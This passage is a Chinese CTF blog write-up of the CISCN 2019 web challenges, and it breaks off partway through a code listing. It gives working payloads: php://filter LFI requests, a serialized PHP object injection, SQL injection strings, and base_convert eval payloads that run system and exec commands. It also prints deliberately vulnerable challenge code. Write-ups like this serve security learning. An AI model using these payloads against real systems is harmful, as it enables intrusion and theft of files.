@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前说好高产一波碰上期末就失败了Orz，赶紧补一下四月底的国赛">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2019 web 复现">
+<meta property="og:url" content="http://yoursite.com/2019/06/21/ciscn2019-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="之前说好高产一波碰上期末就失败了Orz，赶紧补一下四月底的国赛">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/fbe0a10fe228a5e1cca139ef7c07c493.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/f873e282cf6aa12845b08555280d2278.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/fbb2ce6dd29a73b852e10043041cc612.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/b537b8ece60fbf36fa3f8b3f9f50830b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/e5d0eceeb3b3813854ebc1c0903b7392.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/6e6a7d148d72172e269a2634256aa61f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/b80e3033b01017aceb71a86b0f60cdd4.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/1cdee3575d5f926013b8c7cf12e17f21.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/6bdfdf95d953d1e03c5a3fe31f564687.png">
+<meta property="og:updated_time" content="2020-03-18T14:22:17.019Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ciscn2019 web 复现">
+<meta name="twitter:description" content="之前说好高产一波碰上期末就失败了Orz，赶紧补一下四月底的国赛">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/fbe0a10fe228a5e1cca139ef7c07c493.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/21/ciscn2019-web-wp/">
+
+
+
+
+
+  <title>ciscn2019 web 复现 | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/21/ciscn2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ciscn2019 web 复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-21T13:55:33+09:00">
+                2019-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前说好高产一波碰上期末就失败了Orz，赶紧补一下四月底的国赛</p>
+<a id="more"></a>
+<h2 id="JustSoSo"><a href="#JustSoSo" class="headerlink" title="JustSoSo"></a>JustSoSo</h2><p>算是一道简单的题<br>首先F12发现提示</p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/fbe0a10fe228a5e1cca139ef7c07c493.png" alt=""></p>
+<p>于是filer协议一波获得源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>
+<p>先读一下index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$payload = $_GET[&quot;payload&quot;];</span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line">	echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">	die(&apos;hack attacked!!!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">if(isset($payload))</span><br><span class="line">&#123;  </span><br><span class="line">	$url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">	parse_str($url[&apos;query&apos;],$query);</span><br><span class="line">	foreach($query as $value)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		if (preg_match(&quot;/flag/&quot;,$value))&#123;</span><br><span class="line">			die(&apos;stop hacking!&apos;);</span><br><span class="line">			exit();</span><br><span class="line">		&#125;    </span><br><span class="line">	&#125;</span><br><span class="line">	$payload = unserialize($payload);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;Missing parameters&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- Please test index.php?file=xxx.php  --&gt;</span><br><span class="line">&lt;!-- Please get the source of hint.php --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到不允许我们直接用file参数读取flag文件，那flag八成在flag.php或者flag.txt<br>然后又对payload参数进行了flag的过滤，不过parse_url($_SERVER[‘REQUEST_URI’])我们可以通过在域名后用///使得处理后的值为false从而绕过检查<br>最后将payload反序列化，那应该就是要通过这里拿flag了</p>
+<p>然后读hint.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Handle&#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">       foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k = null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking up\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line"></span><br><span class="line">    function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getFlag()&#123;</span><br><span class="line">        $this-&gt;token_flag = md5(rand(1,10000));</span><br><span class="line">     	if($this-&gt;token === $this-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($this-&gt;file))&#123;</span><br><span class="line">                echo @highlight_file($this-&gt;file,true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在Flag类的getFile方法有一处读取文件，那应该就是要通过这里拿flag了。不过前面要绕过token与token_flag的对比，这里用不了弱类型，不过我们可以用引用。类似与C++里的指针，不过php里用得太少就没想到。<br>绕过这个后，看到Handle类里的析构方法，会调用handle属性的getFlag()方法，那就是要把handle属性设为Flag类。然后绕过那个__wakeup()方法只要修改一下序列化后的类的属性数量就ok</p>
+<p>于是拿hint.php构造一波</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$f = new Flag(&apos;flag.php&apos;);</span><br><span class="line">$f-&gt;token = &amp;$f-&gt;token_flag;</span><br><span class="line">$h = new Handle($f);</span><br><span class="line">$a = serialize($h);</span><br><span class="line">echo urlencode($a);</span><br></pre></td></tr></table></figure>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22bf1b2f4b901c21a1d8645018ea9aeb05%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</span><br></pre></td></tr></table></figure>
+<p>然而我在本地试了无数次都不行，查了一堆才发现我的php5版本为5.6.28，然而这个漏洞在php5要在5.6.25一下，php7要在7.0.10【吐血ing</p>
+<h2 id="全宇宙最简单的SQL"><a href="#全宇宙最简单的SQL" class="headerlink" title="全宇宙最简单的SQL"></a>全宇宙最简单的SQL</h2><p>这题不太好复现，当时做的时候大概就是fuzz出了<br><code>if or sleep when case</code><br>这些常用的字符。布尔和时间盲注是不太行了，于是尝试报错盲注，发现exp没被过滤，那接下来就是一顿操作了</p>
+<p><code>&#39; union select (select((ascii(substr(database(),1,1))=96)))*999*pow(999,102)#</code></p>
+<p>成功跑出数据库名和user(),但由于过滤了or，information_schema库访问不了，mysql库也缺权限。虽然列可以不用知道，但不能没表名，只能靠猜了，不过表名确实也很“弱表名”——user</p>
+<p>于是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select (select((ascii(substr((select(select d.1 from (select * from (select 1)b,(select 2)c union select * from user)d limit 1 offset 2)e),1,1))=96)))*999*pow(999,102)#</span><br></pre></td></tr></table></figure>
+<p>成功，于是脚本跑一波得到密码，进去后是个mysql扫描器，和ddctf那题一样，部署一下伪装的mysql服务器然后让扫描器去扫就能获取任意文件了<br>【这题当时做时用了locate()没区分大小写一直登不进去到自闭orz</p>
+<h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><p>一道非常硬核的题目，各种奇淫技巧都用上了</p>
+<p>先读源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span><br><span class="line">if(!isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    $content = $_GET[&apos;c&apos;]; </span><br><span class="line">    if (strlen($content) &gt;= 80) &#123; </span><br><span class="line">        die(&quot;太长了不会算&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; </span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span><br><span class="line">    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123; </span><br><span class="line">        if (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //帮你算出答案 </span><br><span class="line">    eval(&apos;echo &apos;.$content.&apos;;&apos;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到对参数c限制了长度小于80，同时过滤了一些常用的字符，然后只允许所有存在的字符串都要时白名单中的字符串<br>最后一个eval，一看要利用的地方就是这里</p>
+<p>先想办法用<code>system(&#39;ls&#39;)</code>跑出目录来<br>看白名单列表，只有base_convert和hexdec是能将数字转成字符串的。base_convert能将字符在36进制内随意转换，那就利用这个</p>
+<p>先试一下system在哪个进制下长度最短</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;=36;$i++)&#123;</span><br><span class="line">	echo $i.&quot;   &quot;.base_convert(&quot;system&quot;,35,$i).&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现比较适合的是9进制（转化后全为数字）。</p>
+<p>然后试ls发现在21进制下最适合</p>
+<p>接着是一波echo的奇淫技巧，我们可以用echo ($a=1);输出同时给a赋值。然后在php7下我们还可以echo ($a=function)();执行一个函数。这样我们可以用一个短变量名代替base_convert简短字符量。于是我们拿最短的pi作为变量名</p>
+<p><code>?c=($pi=base_convert)(3833484266,9,35)($pi(197,21,29))</code></p>
+<p>一波跑出目录</p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/f873e282cf6aa12845b08555280d2278.png" alt=""></p>
+<p>于是尝试system(‘cat flag.txt’)<br>这里.单用给的函数是解决不了的，但我们可以用base_convert构造出任意函数，于是选用hex2bin来转标点符号</p>
+<p>于是还是先测hex2bin的长度，在14进制下是比较适合的。但是转后的字符还是有个a，于是又要改进制，但这里没必要用base_convert（太长了），用dechex就ok。然后构造一波，发现长度大过80，接着尝试构造<code>system(&#39;cat *&#39;)</code>，正好是80位，还是用不了</p>
+<p>于是改个方向不用system，用更短的exec。但exec只能读最后一行，于是我们要构造的是<code>exec(&#39;cat f*&#39;)</code></p>
+<p>再跑一波发现exec使用23进制比较适合，然后就是一波操作构造出payload</p>
+<p><code>?c=($pi=base_convert)(22950,23,34)($pi(1438255411,14,34)(dechex(109270211257898)))</code></p>
+<p>正好79位，稳</p>
+<p>这题其实还可以_GET，system，getallheaders 或者 readfile这些函数，然后利用php7才有的{}去传入数据</p>
+<h2 id="RefSpace"><a href="#RefSpace" class="headerlink" title="RefSpace"></a>RefSpace</h2><p>挺综合的题吧，这题因为本地环境用的是5.6所以改了一些代码，然后没做FlanSDK的全局引入所以脚本基本都会多一句引入</p>
+<p>首先访问，可以看到明显的文件包含</p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/fbb2ce6dd29a73b852e10043041cc612.png" alt=""></p>
+<p>于是一波操作把能搞到的代码搞下来</p>
+<p>index.php</p>
+<p><code>php://filter/read=convert.base64-encode/resource=index</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">define(&apos;LFI&apos;, &apos;LFI&apos;);</span><br><span class="line">$lfi = $_GET[&apos;route&apos;] ?: false;</span><br><span class="line">if (!$lfi) &#123;</span><br><span class="line">    header(&quot;location: ?route=app/index&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;&#123;$lfi&#125;.php&quot;;</span><br><span class="line">//Good job, you know how to use LFI, don‘t you?</span><br><span class="line">//But You are still far from flag</span><br><span class="line">//hint: ?router=app/flag</span><br></pre></td></tr></table></figure>
+<p>app/flag.php</p>
+<p><code>php://filter/read=convert.base64-encode/resource=app/flag</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line"> 	echo &quot;Include me!&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">include(&quot;FlagSDK.php&quot;);</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$sdk = new FlagSDK();</span><br><span class="line">$key = $_GET[&apos;key&apos;] ?: false;</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">	echo &quot;Please provide access key&lt;br \&gt;&quot;;</span><br><span class="line">	echo $_GET[&quot;key&quot;];</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$flag = $sdk-&gt;verify($key);</span><br><span class="line">if ($flag) &#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo &quot;Wrong Key&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">//Do you want to know more about this SDK?</span><br><span class="line">//we ‘accidentally‘ save a backup.zip for more information</span><br></pre></td></tr></table></figure>
+<p>app/index.php</p>
+<p><code>php://filter/read=convert.base64-encode/resource=app/index</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">	echo &quot;Include me!&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">	Hi CTFer,&lt;br /&gt;</span><br><span class="line">	这是一个非常非常简单的SDK服务，它的任务是给各位大佬&lt;!--鼠--&gt;提供flag&lt;br /&gt;</span><br><span class="line">	Powered by Aoisystem&lt;br /&gt;</span><br><span class="line">	&lt;!-- error_reporting(E_ALL); --&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到flag.php处引入了一个FlagSDK类，进行了一系列操作后就能得到flag<br>继续摸，访问robots.txt发现app/Up10aD.php</p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/b537b8ece60fbf36fa3f8b3f9f50830b.png" alt=""></p>
+<p>于是拿一波源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">	echo &quot;Include me!&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">	$filename = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">	$fileext = &quot;.gif&quot;;</span><br><span class="line">	switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;</span><br><span class="line">		case &apos;image/gif&apos;:</span><br><span class="line">			$fileext = &quot;.gif&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case &apos;image/jpeg&apos;:</span><br><span class="line">			$fileext = &quot;.jpg&quot;;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			echo &quot;Only gif/jpg allowed&quot;;</span><br><span class="line">			exit();</span><br><span class="line">	&#125;</span><br><span class="line">	$dst = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . $fileext;</span><br><span class="line">	move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);</span><br><span class="line">	echo 